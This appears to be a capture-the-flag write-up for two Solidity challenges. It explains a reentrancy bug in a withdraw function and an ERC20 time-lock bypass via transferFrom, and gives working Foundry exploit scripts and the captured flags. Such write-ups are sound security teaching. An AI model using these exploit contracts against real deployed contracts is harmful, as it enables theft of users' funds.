1. CallMeBack :

Challenge Description :

Attacker can steal all the funds in the CallMeBack contract. Can you show me how?

CallMeBack.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CallMeBack {

    mapping(address => uint256) public balances;

    function donate() public payable {
        balances[msg.sender] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success, "ETH transfer failed");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
Challenge.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "src/CallMeBack.sol";

contract Challenge {
    address public immutable PLAYER;
    CallMeBack public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        CONTRACT = CallMeBack(payable(_contract));
    }

    function solve() external {
        require(address(PLAYER).balance > 10 ether, "NOT_ENOUGH_ETHER");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
My Approach :

After reviewing the given contract code, the vulnerability is located in the CallMeBack contract’s withdraw function, which is susceptible to a reentrancy attack. Here’s why :

  1. The contract doesn’t follow CEI (checks-effects-interactions)
  2. The balance is updated after the external call
  3. The contract uses a low-level call which forwards all gas

Here is how I exploited it :

First, I’ve checked the ETH balance of the CallMeBack contract, and I confirmed that it has 1 ETH.

The exploit script uses a malicious contract (Attack) that implements a receive() function to recursively withdraw funds from the CallMeBack contract. When the CallMeBack contract sends ETH to our contract, the receive() function is triggered, allowing us to withdraw more funds before the CallMeBack contract updates its balance.

CallMeBack.s.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "../src/Challenge.sol";
import {CallMeBack} from "../src/CallMeBack.sol";

contract CallMeBackSolve is Script {
    Challenge ch = Challenge(0xBA84bc2d18ef1dBC02E53007D118fe030E1a9dcA);
    CallMeBack cmb = ch.CONTRACT();

    function run() public{
        console.log("cmb balance %e",address(cmb).balance);
        console.log("player balance %e",address(ch.PLAYER()).balance);

        vm.startBroadcast();
        Attack at = new Attack{value: 1 ether}(ch); //sending 1 ETH to Attack contract to proceed attack
        at.attack();
        
        console.log("cmb balance %e",address(cmb).balance);
        console.log("player balance %e",address(ch.PLAYER()).balance);
        
        ch.solve();
        console.log("is solved",ch.isSolved());  //just to check locally that chall is solved or not
        
        vm.stopBroadcast();
    }
}

contract Attack{
    Challenge public ch;
    CallMeBack public cmb;

    constructor(Challenge _ch) public payable{
        ch = _ch;
        cmb = CallMeBack(ch.CONTRACT());
    }

    receive() external payable {
        // if contract still has funds, keep withdrawing (reentrancy)
        if (address(cmb).balance > 0) {
            cmb.withdraw(1 ether);
        }
    }

    function attack() external{
        cmb.donate{value: 1 ether}();
        cmb.withdraw(1 ether);
        
        //I need my ETH back
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "ETH sent to player failed");
    }
}

After running this script successfully, I accessed the flag from the remote server.

Flag is : QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}

2. Timelock :

Challenge Description :

Your grandpa gave you some coins, but you cannot spend them for 10 years. Can you hack and spend them today?

Timelock.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Timelock is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        }
    }
}
Challenge.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Timelock.sol";

contract Challenge {
    address public immutable PLAYER;
    Timelock public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        CONTRACT = Timelock(payable(_contract));
    }

    function solve() external {
        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
My Approach :

After reviewing the given contract code, the primary objective of the TimeLock contract is to lock the contracts for 10 years without using them. But there exists a subtle vulnerability in the TimeLock contract, which is inheriting the ERC20 contract directly but only applies the lockTokens modifier only on the transfer function, and forgot to override other token transfer functions. So, I’ve got the idea that I can use the transferFrom() function to move the tokens.

Here is how I exploited it :

  1. The player approves spending by using the approve function of ERC20, specifying his address as the spender.
  2. The transferFrom function is then used to transfer the player’s tokens.
Timelock.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {Script, console} from "forge-std/Script.sol";
import{Challenge} from "../src/Challenge.sol";
import{Timelock} from "../src/Timelock.sol";


contract Attack is Script{
    Challenge ch = Challenge(0xD6EdFa9eC1A2Be1992344787Ff76193238e9992d);
    Timelock tl = Timelock(ch.CONTRACT());

    function run() external{
        uint256 playerBalance = ERC20(tl).balanceOf(ch.PLAYER());
        vm.startBroadcast();
        console.log("player balance %e",playerBalance);
        
        ERC20(tl).approve(ch.PLAYER(),playerBalance);
        ERC20(tl).transferFrom(ch.PLAYER(),address(this),playerBalance);

        ch.solve();
        console.log("is solved",ch.isSolved()); //just to check locally that chall is solved or not
        vm.stopBroadcast();
    }
}

After running this script successfully, I accessed the flag from the remote server.

Flag is : QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}
